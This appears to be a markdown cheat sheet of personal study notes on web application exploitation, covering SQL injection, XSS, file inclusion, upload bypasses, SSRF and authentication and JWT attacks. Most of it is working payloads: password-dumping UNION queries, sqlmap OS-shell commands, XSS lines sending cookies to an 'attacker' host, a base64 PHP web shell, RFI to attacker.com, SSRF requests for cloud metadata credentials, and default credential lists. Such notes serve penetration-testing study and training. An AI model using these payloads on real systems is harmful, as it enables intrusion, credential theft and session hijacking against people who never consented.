# 🕸️ Web Hacking & Exploitation

> **Focus:** Analyzing and exploiting web application vulnerabilities following OWASP methodology.

---

## 🌐 HTTP Fundamentals

### Request Methods
| Method | Purpose | Security Context |
|--------|---------|-----------------|
| **GET** | Retrieve data | Parameters visible in URL/logs |
| **POST** | Submit data | Data in body (logins, uploads) |
| **PUT** | Create/Replace resource | Web shell upload if misconfigured |
| **DELETE** | Remove resource | IDOR / access control testing |
| **PATCH** | Partial update | Parameter tampering |
| **OPTIONS** | Show allowed methods | Recon (CORS, allowed verbs) |

### Important Headers for Pentesting
| Header | Offensive Use |
|--------|--------------|
| `Cookie` | Session hijacking, token manipulation |
| `Authorization` | Bearer token theft, JWT attacks |
| `X-Forwarded-For` | IP spoofing to bypass restrictions |
| `Referer` | Bypass referer-based access controls |
| `Content-Type` | Switch to XML for XXE, JSON for injection |
| `Host` | Virtual host routing, SSRF |

### HTTP Status Codes (Pentest Relevant)
| Code | Meaning | Action |
|------|---------|--------|
| 200 | OK | Content accessible |
| 301/302 | Redirect | Follow, check for open redirect |
| 401 | Unauthorized | Needs auth (brute-force target) |
| 403 | Forbidden | Exists but blocked (try bypass) |
| 405 | Method Not Allowed | Try other HTTP methods |
| 500 | Server Error | Possible injection point |

---

## 💉 SQL Injection (SQLi)

### Detection Payloads
```
'
"
' OR 1=1--
' OR 1=1#
" OR ""="
' UNION SELECT NULL--
1' AND '1'='1
1' AND '1'='2
```

### Types
| Type | Description | Detection |
|------|-------------|-----------|
| Error-based | DB errors reveal data | Visible error messages |
| UNION-based | Combine queries to extract data | Append UNION SELECT |
| Blind (Boolean) | True/False responses differ | Response length changes |
| Blind (Time) | Response time differs | SLEEP causes delay |
| Out-of-Band | Data sent to external server | DNS/HTTP callbacks |

### UNION-Based Methodology
```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    (error = previous number is correct)

-- Step 2: Find displayable columns
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--

-- Step 3: Extract database info
' UNION SELECT version(),database(),user()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- Step 4: Dump data
' UNION SELECT username,password,NULL FROM users--
```

### Blind Boolean Example
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32--
```

### Blind Time-Based
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### SQLMap Quick Reference
```bash
# GET parameter
sqlmap -u "http://target/page?id=1" --dbs

# POST (from Burp saved request)
sqlmap -r request.txt --batch --dbs

# Dump table
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment --random-agent
```

---

## 🎯 Cross-Site Scripting (XSS)

### Types
| Type | Where it executes | Persistence |
|------|-------------------|-------------|
| Reflected | URL parameter reflected in page | None (requires victim click) |
| Stored | Saved in DB, shown to all users | Persistent |
| DOM-based | Client-side JS manipulation | None |

### Test Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<body onload=alert(1)>
```

### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### Cookie Stealing (Stored XSS)
```html
<script>document.location='http://attacker/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">
```

---

## 📁 File Inclusion (LFI / RFI)

### Local File Inclusion (LFI)
```
# Basic
?page=../../../../etc/passwd
?file=....//....//....//etc/passwd

# Null byte (PHP < 5.3)
?page=../../../../etc/passwd%00

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://input  (POST data as code)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning (inject into User-Agent, then include log)
?page=/var/log/apache2/access.log
?page=/var/log/nginx/access.log
?page=/proc/self/environ
```

### Common Files to Read
```
# Linux
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/home/user/.ssh/id_rsa
/var/log/apache2/access.log
/proc/self/environ

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

### Remote File Inclusion (RFI)
```
?page=http://attacker.com/shell.txt
?page=\\attacker.com\share\shell.php
```

---

## 📤 File Upload Attacks

### Bypass Techniques
| Filter | Bypass |
|--------|--------|
| Extension blacklist | .php5, .phtml, .phar, .PhP, .php.jpg |
| Content-Type check | Change header to image/jpeg |
| Magic bytes | Add GIF89a; before payload |
| Double extension | shell.php.jpg, shell.jpg.php |
| Null byte | shell.php%00.jpg |
| .htaccess upload | Upload .htaccess to make .jpg execute as PHP |

### Methodology
```
1. Upload normal file (test functionality)
2. Upload with changed extension (.php5, .phtml)
3. Upload with double extension (shell.php.jpg)
4. Change Content-Type header in Burp
5. Add magic bytes (GIF89a;) before payload
6. Try uploading .htaccess first
7. Try case variations (.pHp, .PHP)
```

---

## 🌐 Server-Side Request Forgery (SSRF)

### Basic Payloads
```
# Access internal services
http://127.0.0.1:80
http://localhost:8080/admin
http://0.0.0.0:22

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/
```

### Bypass Filters
```
# IP alternatives for 127.0.0.1
http://2130706433 (decimal)
http://0x7f000001 (hex)
http://017700000001 (octal)
http://127.1
http://[::1]

# DNS rebinding
Use a domain that resolves to 127.0.0.1

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31
```

---

## 🔐 Authentication Attacks

### Default Credentials (always try first)
```
admin:admin
admin:password
root:root
root:toor
administrator:administrator
guest:guest
test:test
```

### JWT Attacks
```
# None algorithm
Change header to {"alg":"none"} and remove signature

# Key confusion (RS256 to HS256)
Change alg from RS256 to HS256, sign with public key

# Brute force secret
hashcat -m 16500 jwt.txt -a 3 -w 2 /usr/share/wordlists/rockyou.txt

# Tools: jwt_tool, jwt.io
```

### 2FA Bypass Techniques
```
- Response manipulation (change "success":false to true)
- Brute force the code (if no rate limiting)
- Reuse old valid codes
- Skip the 2FA step (go directly to post-auth URL)
- Use backup codes
```

---

## 🔗 Associated Tools
* [Burp Suite](../../TOOLS/burpsuite.md) - Intercepting proxy for all web testing
* [SQLMap](../../TOOLS/sqlmap.md) - SQL injection automation
* [Gobuster](../../TOOLS/gobuster.md) - Directory and file discovery
* [Hydra](../../TOOLS/hydra.md) - Login brute-forcing

---

## 📚 Resources
- PortSwigger Web Security Academy (free labs)
- OWASP Testing Guide
- HackTricks Web section
- PayloadsAllTheThings (GitHub)
